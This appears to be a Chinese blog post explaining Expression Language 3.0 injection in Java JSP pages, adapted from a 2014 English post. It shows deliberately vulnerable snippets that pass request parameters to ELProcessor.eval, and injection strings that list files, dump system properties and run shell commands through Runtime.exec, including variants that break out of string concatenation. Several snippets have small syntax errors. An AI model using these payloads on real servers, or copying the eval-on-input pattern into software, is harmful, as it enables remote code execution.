title: "Eval is evil: A EL3 Labmda Injection Attack in Java"
date: 2016-01-15 10:19:52
tags:
- 安全
categories:
- Java

---

原文：<http://sectooladdict.blogspot.com/2014/12/el-30-injection-java-is-getting-hacker.html>

JSR341 [EL in Java](http://www.infoq.com/news/2013/07/el3)在最新的EL3.0中包含了多个增强：运算符，对类访问的安全限制等。

最常见的EL3的使用场景：

```
<%
ELProcessor elp = new ELProcessor();
Object msg = elp.eval("Welcome" + user.name);
out.println(msg.toString());
%>
```

EL Processor将会动态的eval进来的EL statement，比如这里是user.name，user可能是Bean或者注入的Java Class。这里就涉及到对类或者Bean的访问问题，EL3.0引入了ELManager来管理这些访问的安全问题，包含方法：`importClass, importPackage, importStatic`。这些方法可以用import各种各样的类甚至package进入EL的上下文里，然后可以被EL里的statement引用。因此为了使用Java class在EL中，可能需要如下语句：

```
elp.getELManager().importClass("java.io.File");
```

ELManager在这里的实现主要是为了保证EL中eval的上下文环境只能访问通过ELManager引入的内容，而不能访问外部的类。但是因为在JSP和Servlet中用到了大量的通用和常见的类，所以EL里eval还是有可能被滥用：

(1) 如果开发者已经import了攻击者所需要的类，则攻击者可以使用如下方式：

```
Input1 = "File.listRoots()[0].getAbsolutePath()";
<%@page import="javax.el.ELProcessor"%>
<%@page import="javax.el.ELManager">
...
<%
String input1 = request.getParameter("input1");
ELProcessor elp = new ELProcessor();
elp.getELManager().importClass("java.io.File");
Object path = elp.eval(input1);
out.println(path);
%>
```

(2) 如果开发者开放了攻击者可以import class或者package，也就是对传入的内容没有任何限制：

```
Input1 = "File.listRoots()[0].listFiles()[1].getAbsolutePath()"
Input2 = "java.io.File";
<%@page import="javax.el.ELProcessor"%>
<%@page import="javax.el.ELManager"%>
…
<%
String input1 = request.getParameter("input1");
String input2 = request.getParameter("input2");
ELProcessor elp = new ELProcessor();
elp.getELManager().importClass(Input2);
Object path = elp.eval(input1);
out.println(path);
%>
```

--------------------------------

尽管有ELManager对importClass importPackage这样的限制，但是一个很容易被攻击的地方是，EL默认载入了`java.lang`包，为了便于开发者可以访问一些静态类型，比如：`Boolean.True Integer.numberOfTrailingZero`。

EL默认所有的statement可以访问`java.lang`的静态对象，比如：`java.lang.System` 和 `java.lang.Runtime`，攻击者很容易滥用这些机制：

```
Input1 = "System.getProperties()"
<%@page import="javax.el.ELProcessor"%>
<%@page import="javax.el.ELManager"%>
…
<%
String input1 = request.getParameter("input1");
ELProcessor elp = new ELProcessor();
Object sys = elp.eval(input1);
out.println(sys);
%>
```

或者使用`java.lang.Runtime`进行远程执行：

```
Input1 = "Runtime.getRuntime().exec('mkdir abcde').waitFor()"
<%@page import="javax.el.ELProcessor"%>
<%@page import="javax.el.ELManager"%>
…
<%
String input1 = request.getParameter("input1");
ELProcessor elp = new ELProcessor();
Object sys = elp.eval(input1);
out.println(sys);
%>
```

虽然上面的举例，攻击者可以通过外部输入的字串（input）完全控制EL，但是大部分情况下开发者会对传入的字串进行拼接（concat）而使传入的攻击字串失效，但是道高一尺魔高一丈，由于EL引入的**NEW**操作符，导致拼接的字串可以像`SQL Injection`一样被`;`截断：

```
Input1 = "; Runtime.getRuntime().exec('mkdir aaaaa12').waitFor()"
<%@page import="javax.el.ELProcessor"%>
<%@page import="javax.el.ELManager"%>
…
<%
String input1 = request.getParameter("input1");
ELProcessor elp = new ELProcessor();
Object sys = elp.eval(("'Welcome' + input1);
out.println(sys);
%>
```

远程执行漏洞：

```
Input1 = "1); Runtime.getRuntime().exec('mkdir jjjbc12').waitFor("
<%@page import="javax.el.ELProcessor"%>
<%@page import="javax.el.ELManager"%>
…
<%
String input1 = request.getParameter("input1");
ELProcessor elp = new ELProcessor();
Object sys = elp.eval(("SomeClass.StaticMethod( + input1 + ")");
out.println(sys);
%>
```

-END-
